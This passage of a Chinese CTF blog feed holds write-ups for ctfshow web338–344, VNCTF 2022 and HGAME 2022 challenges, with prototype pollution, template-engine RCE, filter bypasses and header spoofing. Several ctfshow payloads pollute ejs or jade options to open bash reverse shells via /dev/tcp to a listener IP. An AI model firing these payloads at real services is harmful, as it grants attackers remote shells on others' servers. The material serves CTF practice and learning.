alt="image-20220222164222078"></p><p>猜测是原型链污染</p><p>看login.js</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222164251260.png" alt="image-20220222164251260"></p><p>让secert的ctfshow属性等于36dboy</p><p>{&quot;__proto__&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</p><p>抓包之后改一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171254531.png" alt="image-20220222171254531"></p><h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p><strong>非预期解：</strong>利用ejs模板rce漏洞</p><p>羽师傅的payload：</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;</code></pre><p>反弹之前可以先关一下服务器的防火墙systemctl stop firewalld</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225454461.png" alt="image-20220222225454461"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225546970.png" alt="image-20220222225546970"></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p><p><a href="https://blog.csdn.net/gental_z/article/details/107937110">CVE-2020-7699漏洞分析_gental_z的博客-CSDN博客</a></p><p><strong>预期解：</strong></p><p>登录部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222170708843.png" alt="image-20220222170708843"></p><p>同样的copy函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222170726147.png" alt="image-20220222170726147"></p><p>这里要求ctfshow=flag的内容，可我们并不知道flag</p><p>我们再看看api.js</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171015673.png" alt="image-20220222171015673"></p><p>Function里的query变量没有被引用</p><p>如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作</p><p>但是这个是变量不是变量的属性，也能污染吗</p><p>答案是可以的</p><pre class="language-none"><code class="language-none">因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220519170152098.png" alt="image-20220519170152098"></p><p>所以我们可以构造payload</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre><p>在login页面post一下进行污染</p><p>然后访问一下api页面触发query</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222203151541.png" alt="image-20220222203151541"></p><h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>登录部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210758117.png" alt="image-20220222210758117"></p><p>copy函数：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210810876.png" alt="image-20220222210810876"></p><p>这道题与web339利用点是相同的，我们同样要利用原型链污染来控制query的值达到反弹shell的目的。但是需要向上污染两级才能到达Object对象</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210739146.png" alt="image-20220222210739146"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210925672.png" alt="image-20220222210925672"></p><p>所以我们的payload为</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p>同样传入之后访问一下api页面就行</p><h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>没有了api.js</p><p>所以只能用web339的那个非预期解，只是要跟web340一样向上污染两级</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225203273.png" alt="image-20220222225203273"></p><h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342-web343"></a>web342-web343</h2><p>同样是模板引擎的rce，不过不是之前的ejs，而是jade</p><p><a href="https://xz.aliyun.com/t/7025">再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p><p><a href="https://xz.aliyun.com/t/7075#toc-0">ejs原型污染rce分析 - 先知社区 (aliyun.com)</a></p><p>用一个payload都能打</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220223144941601.png" alt="image-20220223144941601"></p><h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>代码：</p><pre class="language-none"><code class="language-none">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag &#x3D; &#39;flag_here&#39;;  if(req.url.match(&#x2F;8c|2c|\,&#x2F;ig))&#123;  res.end(&#39;where is flag :)&#39;);  &#125;  var query &#x3D; JSON.parse(req.query.query);  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;  res.end(flag);  &#125;else&#123;  res.end(&#39;where is flag. :)&#39;);  &#125;&#125;);</code></pre><p>如果没有过滤，那么我们直接传入</p><pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code></pre><p>就行，但是题目把逗号和他的url编码过滤了</p><p>这时就要尝试用&amp;绕过</p><pre class="language-none"><code class="language-none">nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析</code></pre><p>所以最终payload为</p><pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; </code></pre><p>把c也编码的原因是防止和双引号的url编码构成%22c</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220223150552411.png" alt="image-20220223150552411"></p><p>1</p><pre class="language-none"><code class="language-none">const crypto &#x3D; require(&#39;crypto&#39;);const express &#x3D; require(&#39;express&#39;);const session &#x3D; require(&quot;express-session&quot;);const app &#x3D; express();const jwt &#x3D; require(&quot;jsonwebtoken&quot;);const fs &#x3D; require(&quot;fs&quot;)const bodyParser &#x3D; require(&#39;body-parser&#39;)session_secret &#x3D; Math.random().toString(36).substr(2);const cookieParser &#x3D; require(&#39;cookie-parser&#39;);const &#123;json&#125; &#x3D; require(&quot;express&quot;);app.use(cookieParser(session_secret));app.use(bodyParser.json())app.use(session(&#123; secret: session_secret, resave: true, saveUninitialized: true &#125;))const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);app.post(&#39;&#x2F;register&#39;, function (req, res) &#123;    const username &#x3D; req.body.name;    if ( username &#x3D;&#x3D; &#39;admin&#39;)&#123;        res.send(&quot;admin not allowed&quot;);        return    &#125;    const token &#x3D; jwt.sign(&#123;username&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);    res.send(&#123;token: token&#125;);&#125;);app.post(&#39;&#x2F;login&#39;, function (req, res) &#123;    const token &#x3D; req.body.auth    try &#123;        jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;,function (_,user)&#123;            console.log(user)            req.session.user &#x3D; &#123;&quot;username&quot;:user.username&#125;        &#125;);    &#125;catch (e) &#123;        res.send(&quot;login error&quot;)        return    &#125;    res.send(req.session.user.username + &quot; login successfully&quot;)&#125;);app.post(&#39;&#x2F;readfile&#39;, function (req, res) &#123;    if (req.session.user.username !&#x3D;&#x3D; &quot;admin&quot;)&#123;        res.send(&quot;only admin can get flag&quot;)        return    &#125;    if (typeof req.body[&quot;secret&quot;] !&#x3D;&#x3D; &quot;number&quot;)&#123;        &#x2F;&#x2F;仅允许16进字符串        let regex_pattern &#x3D; &#x2F;^[a-fA-F\d.]+$&#x2F;        if (!regex_pattern.test(req.body[&quot;secret&quot;]))&#123;            res.send(&quot;only valid string under 16 radix allowed&quot;)            return        &#125;    &#125;    if (req.body.file &amp;&amp; parseInt(req.body[&quot;secret&quot;],16) &#x3D;&#x3D;&#x3D; 158 &amp;&amp; parseFloat(req.body[&quot;secret&quot;]) &lt; 9)&#123;        let file_param &#x3D; JSON.stringify(req.body.file)        if (file_param.includes(&quot;flag&quot;) || file_param.includes(&quot;fd&quot;)) &#123;            res.send(&quot;flag not allowed&quot;)            return        &#125;else &#123;            res.setHeader(&quot;Content-Type&quot;, &quot;text&#x2F;html&quot;);            res.send(fs.readFileSync(req.body.file || &quot;app.js&quot;).toString())            return        &#125;    &#125;    res.send(&quot;try to read &#x2F;flag&quot;)&#125;);app.get(&#39;&#x2F;&#39;, function (req, res) &#123;    res.send(&#39;see &#96;&#x2F;src&#96;&#39;);&#125;);app.get(&#39;&#x2F;src&#39;, function (req, res) &#123;    var data &#x3D; fs.readFileSync(&#39;app.js&#39;);    res.send(data.toString());&#125;);app.listen(3000, function () &#123;    console.log(&#39;start listening on port 3000&#39;);&#125;);</code></pre><p>1</p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF复现</title>
      <link href="/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h2><p>纯签到题</p><p>源码里找flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214122029407.png"></p><p>base64解码</p><h2 id="gocalc0"><a href="#gocalc0" class="headerlink" title="gocalc0"></a>gocalc0</h2><p>非预期解：</p><pre class="language-none"><code class="language-none">&#123;&#123;.&#125;&#125;</code></pre><p>查源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214125228998.png" alt="image-20220214125228998"></p><p>flag在/flag路径，尝试去访问</p><p>然后提示flag在session中</p><p>对session进行base64解码(第二次解码如果全放进去解不出内容，要一点一点试)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214125352267.png" alt="image-20220214125352267"></p><p>预期解：</p><p>拿到源码之后根据源码写个exp</p><pre class="language-none"><code class="language-none">package mainimport (_ &quot;embed&quot;&quot;fmt&quot;&quot;os&quot;&quot;reflect&quot;&quot;strings&quot;&quot;text&#x2F;template&quot;&quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot;&quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot;&quot;github.com&#x2F;gin-gonic&#x2F;gin&quot;&quot;github.com&#x2F;maja42&#x2F;goval&quot;)&#x2F;&#x2F;go:embed template&#x2F;index.htmlvar tpl string&#x2F;&#x2F;go:embed main.govar source stringtype Eval struct &#123;E string &#96;json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;&#96;&#125;func (e Eval) Result() (string, error) &#123;eval :&#x3D; goval.NewEvaluator()result, err :&#x3D; eval.Evaluate(e.E, nil, nil)if err !&#x3D; nil &#123;return &quot;&quot;, err&#125;t :&#x3D; reflect.ValueOf(result).Type().Kind()if t &#x3D;&#x3D; reflect.Int &#123;return fmt.Sprintf(&quot;%d&quot;, result.(int)), nil&#125; else if t &#x3D;&#x3D; reflect.String &#123;return result.(string), nil&#125; else &#123;return &quot;&quot;, fmt.Errorf(&quot;not valid type&quot;)&#125;&#125;func (e Eval) String() string &#123;res, err :&#x3D; e.Result()if err !&#x3D; nil &#123;fmt.Println(err)res &#x3D; &quot;invalid&quot;&#125;return fmt.Sprintf(&quot;%s &#x3D; %s&quot;, e.E, res)&#125;func render(c *gin.Context) &#123;session :&#x3D; sessions.Default(c)var his stringif session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123;his &#x3D; &quot;&quot;&#125; else &#123;his &#x3D; session.Get(&quot;history&quot;).(string)&#125;fmt.Println(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his))t, err :&#x3D; template.New(&quot;index&quot;).Parse(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his))if err !&#x3D; nil &#123;fmt.Println(err)c.String(500, &quot;internal error&quot;)return&#125;if err :&#x3D; t.Execute(c.Writer, map[string]string&#123;&quot;s0uR3e&quot;: source,&#125;); err !&#x3D; nil &#123;fmt.Println(err)&#125;&#125;func main() &#123;port :&#x3D; os.Getenv(&quot;PORT&quot;)if port &#x3D;&#x3D; &quot;&quot; &#123;port &#x3D; &quot;8080&quot;&#125;r :&#x3D; gin.Default()store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;))r.Use(sessions.Sessions(&quot;session&quot;, store))r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;render(c)&#125;)r.GET(&quot;&#x2F;flag&quot;, func(c *gin.Context) &#123;session :&#x3D; sessions.Default(c)session.Set(&quot;FLAG&quot;, os.Getenv(&quot;FLAG&quot;))session.Save()c.String(200, &quot;flag is in your session&quot;)&#125;)r.POST(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;session :&#x3D; sessions.Default(c)var his stringif session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123;his &#x3D; &quot;&quot;&#125; else &#123;his &#x3D; session.Get(&quot;history&quot;).(string)&#125;eval :&#x3D; Eval&#123;&#125;if err :&#x3D; c.ShouldBind(&amp;eval); err &#x3D;&#x3D; nil &#123;his &#x3D; his + eval.String() + &quot;&lt;br&#x2F;&gt;&quot;&#125;session.Set(&quot;history&quot;, his)session.Save()render(c)&#125;)r.Run(fmt.Sprintf(&quot;:%s&quot;, port))&#125;</code></pre><p>exp：</p><pre class="language-go" data-language="go"><code class="language-go">package mainimport (   _ &quot;embed&quot;   &quot;fmt&quot;   &quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot;   &quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot;   &quot;github.com&#x2F;gin-gonic&#x2F;gin&quot;   &quot;os&quot;)func main() &#123;   port :&#x3D; os.Getenv(&quot;PORT&quot;)   if port &#x3D;&#x3D; &quot;&quot; &#123;      port &#x3D; &quot;8080&quot;   &#125;   r :&#x3D; gin.Default()   store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;))   r.Use(sessions.Sessions(&quot;session&quot;, store))   r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;      session :&#x3D; sessions.Default(c)      println(session.Get(&quot;FLAG&quot;).(string))   &#125;)   r.Run(fmt.Sprintf(&quot;:%s&quot;, port))&#125;</code></pre><p>这部分等学了go之后再看看，先放着</p><h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><p>考点：<strong>原型污染通过 console.table 属性（低）（CVE-2022-21824）</strong></p><p>由于 console.table() 函数的格式化逻辑，允许用户控制的输入传递给 properties 参数同时传递一个是不安全的具有至少一个属性作为第一个参数的普通对象，可以是<code>__proto__</code>. 原型污染的控制非常有限，因为它只允许为对象原型的数字键分配一个空字符串。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115638665.png" alt="image-20220215115638665"></p><p>exp： <code>console.table([&#123; x : 1 &#125;], [ &quot;__proto__&quot; ]);</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115645015.png" alt="image-20220215115645015"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115655004.png" alt="image-20220215115655004"></p><h2 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h2><p>存在任意文件读取</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115704939.png" alt="image-20220215115704939"></p><p>读不到flag，应该是要通过调用readflag来读取flag</p><pre class="language-none"><code class="language-none">file?url&#x3D;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;</code></pre><p>反编译看一下源码</p><p>Secr3t.jad</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.&#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.kpdus.com&#x2F;jad.html&#x2F;&#x2F; Decompiler options: packimports(3) &#x2F;&#x2F; Source File Name:   Secr3t.javapackage util;import java.io.*;import org.apache.commons.lang3.RandomStringUtils;public class Secr3t&#123;    private Secr3t()    &#123;    &#125;    public static String getKey()    &#123;        return Key;    &#125;    public static StringBuffer getFlag()    &#123;        InputStream in;        BufferedReader read;        Flag &#x3D; new StringBuffer();        in &#x3D; null;        try        &#123;            in &#x3D; Runtime.getRuntime().exec(&quot;&#x2F;readflag&quot;).getInputStream();        &#125;        catch(IOException e)        &#123;            e.printStackTrace();        &#125;        read &#x3D; new BufferedReader(new InputStreamReader(in));        for(String line &#x3D; null; (line &#x3D; read.readLine()) !&#x3D; null;)            Flag.append((new StringBuilder()).append(line).append(&quot;\n&quot;).toString());        IOException e;        try        &#123;            in.close();            read.close();        &#125;        &#x2F;&#x2F; Misplaced declaration of an exception variable        catch(IOException e)        &#123;            e.printStackTrace();            System.out.println(&quot;Secr3t : io exception!&quot;);        &#125;        break MISSING_BLOCK_LABEL_176;        e;        e.printStackTrace();        try        &#123;            in.close();            read.close();        &#125;        &#x2F;&#x2F; Misplaced declaration of an exception variable        catch(IOException e)        &#123;            e.printStackTrace();            System.out.println(&quot;Secr3t : io exception!&quot;);        &#125;        break MISSING_BLOCK_LABEL_176;        Exception exception;        exception;        try        &#123;            in.close();            read.close();        &#125;        catch(IOException e)        &#123;            e.printStackTrace();            System.out.println(&quot;Secr3t : io exception!&quot;);        &#125;        throw exception;        return Flag;    &#125;    public static boolean check(String checkStr)    &#123;        return &quot;vnctf2022&quot;.equals(checkStr);    &#125;    private static final String Key &#x3D; RandomStringUtils.randomAlphanumeric(32);    private static StringBuffer Flag;&#125;</code></pre><p>HelloWorldServlet.jad</p><pre class="language-java" data-language="java"><code class="language-java">package servlet;import javax.servlet.annotation.*;import entity.*;import javax.servlet.http.*;import java.io.*;import java.util.*;import util.*;import javax.servlet.*;@WebServlet(name &#x3D; &quot;HelloServlet&quot;, urlPatterns &#x3D; &#123; &quot;&#x2F;evi1&quot; &#125;)&#x2F;&#x2F;比赛的时候用的jad反编译的没这块，虽然之后查日志找到了路径public class HelloWorldServlet extends HttpServlet&#123;    private volatile String name;    private volatile String age;    private volatile String height;    User user;        public HelloWorldServlet() &#123;        this.name &#x3D; &quot;m4n_q1u_666&quot;;        this.age &#x3D; &quot;666&quot;;        this.height &#x3D; &quot;180&quot;;    &#125;        public void init() throws ServletException &#123;        this.user &#x3D; new User(this.name, this.age, this.height);    &#125;        protected void doGet(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123;        final String reqName &#x3D; req.getParameter(&quot;name&quot;);        if (reqName !&#x3D; null) &#123;            this.name &#x3D; reqName;        &#125;        if (Secr3t.check(this.name)) &#123;            this.Response(resp, &quot;no vnctf2022!&quot;);            return;        &#125;        if (Secr3t.check(this.name)) &#123;            this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey());        &#125;    &#125;        protected void doPost(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123;        final String key &#x3D; req.getParameter(&quot;key&quot;);        final String text &#x3D; req.getParameter(&quot;base64&quot;);        if (Secr3t.getKey().equals(key) &amp;&amp; text !&#x3D; null) &#123;            final Base64.Decoder decoder &#x3D; Base64.getDecoder();            final byte[] textByte &#x3D; decoder.decode(text);            final User u &#x3D; (User)SerAndDe.deserialize(textByte);            if (this.user.equals((Object)u)) &#123;                this.Response(resp, &quot;Deserialize\u2026\u2026 Flag is &quot; + Secr3t.getFlag().toString());            &#125;        &#125;        else &#123;            this.Response(resp, &quot;KeyError&quot;);        &#125;    &#125;        private void Response(final HttpServletResponse resp, final String outStr) throws IOException &#123;        final ServletOutputStream out &#x3D; resp.getOutputStream();        out.write(outStr.getBytes());        out.flush();        out.close();    &#125;&#125;</code></pre><p>留个坑，不会了，暑假开始学java再来补（</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2022 wp</title>
      <link href="/2022/01/21/HGAME2022-wp/"/>
      <url>/2022/01/21/HGAME2022-wp/</url>
      
        <content type="html"><![CDATA[<p>带*为赛后复现</p><h1 id="第一周wp"><a href="#第一周wp" class="headerlink" title="第一周wp"></a>第一周wp</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="欢迎欢迎！热烈欢迎！"><a href="#欢迎欢迎！热烈欢迎！" class="headerlink" title="欢迎欢迎！热烈欢迎！"></a>欢迎欢迎！热烈欢迎！</h3><p>签到</p><h3 id="这个压缩包有点麻烦"><a href="#这个压缩包有点麻烦" class="headerlink" title="这个压缩包有点麻烦"></a>这个压缩包有点麻烦</h3><p>压缩包，先真加密，爆破得到密码，然后字典爆破，再明文爆破，最后得到的一个藏着伪加密压缩包的图片，破掉伪加密把压缩包解压能得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171347731.png" alt="image-20220121171347731"></p><h3 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h3><p>wireshark打开，追踪tcp流得到一大串base64值，转成图片</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171627907.png" alt="image-20220121171627907"></p><p>stegslove看一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171645072.png" alt="image-20220121171645072"></p><p>找个在线扫条形码的网站扫一下得到前半部分，后半部分利用zsteg能直接看到</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171734983.png" alt="image-20220121171734983"></p><h3 id="群青-其实是幽灵东京）"><a href="#群青-其实是幽灵东京）" class="headerlink" title="群青(其实是幽灵东京）"></a>群青(其实是幽灵东京）</h3><p>第一个音频文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164910035.png" alt="image-20220123164910035"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164940731.png" alt="image-20220123164940731"></p><p>猜密码是yoasobi</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123164849913.png" alt="image-20220123164849913"></p><p>得到一个网址，里面是sstv为文件名的音频文件，用robot36接收一下</p><p>得到一个二维码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123171839098.png" alt="image-20220123171839098"></p><p>扫码拿到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220123171902080.png" alt="image-20220123171902080"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171811854.png" alt="image-20220121171811854"></p><p>题目描述暗示todo里藏着东西，看一下源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171913651.png" alt="image-20220121171913651"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121171925729.png" alt="image-20220121171925729"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172104885.png" alt="image-20220121172104885"></p><p>猜到flag可能再id为1的内容里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172217273.png" alt="image-20220121172217273"></p><p>访问的时候显示没添加cookie或者token</p><p>抓包给他加个jwt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172251918.png" alt="image-20220121172251918"></p><p>jwt可以根据前边的网页抓包得到的jwt修改</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172330976.png" alt="image-20220121172330976"></p><h3 id="蛛蛛-嘿嘿♥我的蛛蛛"><a href="#蛛蛛-嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛...嘿嘿♥我的蛛蛛"></a>蛛蛛...嘿嘿♥我的蛛蛛</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172512414.png" alt="image-20220121172512414"></p><pre class="language-python" data-language="python"><code class="language-python">from time import sleepimport requestsurl &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;key &#x3D; &quot;?key&#x3D;VmqCK2lB2LRY2sM%2F5rEjFXHRemjYkb%2BQ2YHG8z7oy1krIf6R%2FOVrA8Ho5G9rxahnu6%2BTfwj6ZRbt3YP405Y12Q%3D%3D&quot;for i in range(1, 1000):    url &#x3D; &quot;https:&#x2F;&#x2F;hgame-spider.vidar.club&#x2F;6c5920c09d&quot;    url &#x3D; url + key    print(url)    r &#x3D; requests.get(url&#x3D;url)    # if &#39;href&#39; in r.text:    print(r.text)    lstNew &#x3D; r.text    if &#39;href&#39; in lstNew:        start &#x3D; lstNew.find(&quot;href&#x3D;\&quot;?&quot;)        print(start)        end &#x3D; lstNew.find(&quot;D\&quot;&gt;点我试试&quot;)        print(end)        length &#x3D; len(&quot;href&#x3D;\&quot;&quot;)        l &#x3D; lstNew[start + length:end +1]        key &#x3D; l        print(key)        if key &#x3D;&#x3D; &#39;&#39;:            break        sleep(0.5)        if &quot;hgame&#123;&quot; in r.text:            print(r.text)            break    else:        print(r.text)        break</code></pre><p>写的脚本（好拉的编程</p><p>跑到第100关后在响应头里找</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172754893.png" alt="image-20220121172754893"></p><h3 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h3><p>源码里直接找</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172901215.png" alt="image-20220121172901215"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172914978.png" alt="image-20220121172914978"></p><h3 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220121172941617.png" alt="image-20220121172941617"></p><p>先加个referer头为qiumingshan.net</p><p>然后改ua</p><p>再改cookie  flavor = Raspberry</p><p>然后再加上一个Gasoline:100</p><p>再是要求本地登录，但是过滤了xff，换个头就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-1327848764.png" alt="image-20220121172941618"></p><h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><h3 